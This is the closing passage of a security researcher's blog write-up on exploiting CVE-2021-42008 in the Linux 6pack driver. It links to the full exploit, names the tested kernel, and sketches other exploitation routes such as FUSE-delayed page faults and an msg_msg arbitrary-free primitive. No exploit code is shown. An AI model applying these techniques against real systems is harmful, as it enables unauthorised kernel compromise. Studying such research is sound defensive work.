<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/exploit.gif" alt=""></p>

<p>You can find the complete exploit here:</p>

<p style="text-align: center"><a href="https://github.com/0xdevil/CVE-2021-42008">CVE-2021-42008: Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver</a></p>

<p>The exploit is designed and tested for <code class="highlighter-rouge">Debian 11 - Kernel 5.10.0-8-amd64</code>. If you want to port the exploit to other kernel versions, remember that the distance between <strong>sp-&gt;cooked_buf</strong> and the next object in memory may change.</p>

<h3 id="conclusion">Conclusion</h3>

<p>In this article I showed how the techniques presented by FizzBuzz101 
and me with Fire of Salvation and Wall Of Perdition can be used to 
exploit real vulnerabilities in the Linux Kernel. There are many other 
valid approaches to exploit this vulnerability. For example, after 
Kernel 5.11, a <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cefdca0a86be">first patch</a> made <strong>userfaultfd</strong> completely inaccessible for unprivileged users, then a <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d0d4730ac2e4">second patch</a>
 restricted its usage in a way that only page faults from user-mode can 
be handled, so in the second stage, an attacker may simply use <a href="https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel_20.html#:~:text=pause%20the%20kernel%20thread">FUSE</a> to delay page faults <a href="https://twitter.com/tehjh/status/1438330352075001856">creating unprivileged user+mount namespaces</a>, or may <a href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=30">abuse discontiguous file mapping and scheduler behavior</a> instead of using userfaultfd. Another approach for the second stage may be to set <strong>msg_msg.next</strong> to the address of a previously leaked structure, for example <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/seq_file.h#L31">seq_operations</a>, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/umh.h#L19">subprocess_info</a>, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/tty.h#L285">tty_struct</a>
 and so on (check References for a list of exploitable kernel 
structures), and then free the message and its respective segment (now 
pointing to the target structure) using <strong>msgrcv()</strong> without the <strong>MSG_COPY</strong>
 flag. This will result in a powerful arbitrary free primitive. From 
here is possible to cause a Use-After-Free to the target structure and 
hijack the Kernel control flow overwriting a function pointer. Another 
very interesting approach is the one used to exploit <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#achieving-a-better-use-after-free">CVE-2021-22555</a>. As always, for any question or clarification, feel free to contact me (check About).</p>

<h3 id="references">References</h3>

<p><em>6pack</em></p>
<ul>
  <li><a href="https://docs.kernel.org/networking/6pack.html">https://docs.kernel.org/networking/6pack.html</a></li>
</ul>

<p><em>The TTY demystified</em></p>
<ul>
  <li><a href="https://www.linusakesson.net/programming/tty/index.php">https://www.linusakesson.net/programming/tty/index.php</a></li>
</ul>

<p><em>Jiffies in the Linux Kernel</em></p>
<ul>
  <li><a href="https://cyberglory.wordpress.com/2011/08/21/jiffies-in-linux-kernel/">https://cyberglory.wordpress.com/2011/08/21/jiffies-in-linux-kernel/</a></li>
</ul>

<p><em>Utilizing msg_msg Objects For Arbitrary Read And Arbitrary Write In The Linux Kernel</em></p>
<ul>
  <li><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html</a> (Part 1: Fire Of Salvation)</li>
  <li><a href="https://syst3mfailure.io/wall-of-perdition">https://syst3mfailure.io/wall-of-perdition</a> (Part 2: Wall Of Perdition)</li>
</ul>

<p><em>modprobe_path</em></p>
<ul>
  <li><a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/</a></li>
</ul>

<p><em>Exploitable kernel structures</em></p>
<ul>
  <li><a href="https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/">https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/</a></li>
</ul>

                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            
                                <img class="author-profile-image" src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/ghost.png" alt="D3v17">
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="https://syst3mfailure.io/author/D3v17">D3v17</a></h4>
                                
                                    <p>Read <a href="https://syst3mfailure.io/author/D3v17">more posts</a> by this author.</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="https://syst3mfailure.io/author/D3v17">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            
                
                
                
                
                    <article class="read-next-card" style="background-image: url(/assets/images/sflogo.png)">
                        <header class="read-next-card-header">
                            <small class="read-next-card-header-sitetitle">— Syst3m Failure —</small>
                            
                                <h3 class="read-next-card-header-title"><a href="https://syst3mfailure.io/tag/research/">Research</a></h3>
                            
                        </header>
                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"></path></svg>
</div>
                        <div class="read-next-card-content">
                            <ul>
                                
                                
                                  
                                    
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="https://syst3mfailure.io/wall-of-perdition">[corCTF 2021] Wall Of Perdition: Utilizing msg_msg Objects For Arbitrary Read And Arbitrary Write In The Linux Kernel</a></li>
                                        
                                    
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="https://syst3mfailure.io/sudo-heap-overflow">[CVE-2021-3156] Exploiting Sudo Heap Overflow On Debian 10</a></li>
                                        
                                    
                                  
                                
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="https://syst3mfailure.io/ret2dl_resolve">Ret2dl_resolve x64: Exploiting Dynamic Linking Procedure In x64 ELF Binaries</a></li>
                                        
                                    
                                  
                                
                            </ul>
                        </div>
                        <footer class="read-next-card-footer">
                            <a href="https://syst3mfailure.io/tag/research/">
                                
                                    See all 3 posts  →
                                
                            </a>
                        </footer>
                    </article>
                
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="https://syst3mfailure.io/wall-of-perdition">
                <div class="post-card-image" style="background-image: url(/assets/images/wall_of_perdition/title.png)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="https://syst3mfailure.io/wall-of-perdition">
                <header class="post-card-header">
                    
                        
                            
                               <span class="post-card-tags">Ctf</span>
                            
                        
                            
                                <span class="post-card-tags">Research</span>
                            
                        
                    

                    <h2 class="post-card-title">[corCTF 2021] Wall Of Perdition: Utilizing msg_msg Objects For Arbitrary Read And Arbitrary Write In The Linux Kernel</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p></p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/ghost.png" alt="D3v17">
                        
                        <span class="post-card-author">
                            <a href="https://syst3mfailure.io/author/D3v17/">D3v17</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      1 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://syst3mfailure.io/">
            
            <span>Syst3m Failure</span>
        </a>
    </div>
    <span class="floating-header-divider">—</span>
    <div class="floating-header-title">[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"></path>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=%5BCVE-2021-42008%5D+Exploiting+A+16-Year-Old+Vulnerability+In+The+Linux+6pack+Driver&amp;url=https://syst3mfailure.io/sixpack-slab-out-of-bounds" onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://syst3mfailure.io/sixpack-slab-out-of-bounds" onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>

        </a>
    </div>
    <progress class="progress" value="0" max="43754">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->

        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://syst3mfailure.io/">Syst3m Failure</a> © 2022</section>
                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &amp;
                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
                    <a href="https://github.com/jekyller/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
                <nav class="site-footer-nav">
                    <a href="https://syst3mfailure.io/">Latest Posts</a>
                    
                    
                    <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/prism-abap.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/jquery-3.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/jquery.js"></script>
    <script type="text/javascript" src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/jquery.html"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->

    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->



</body></html>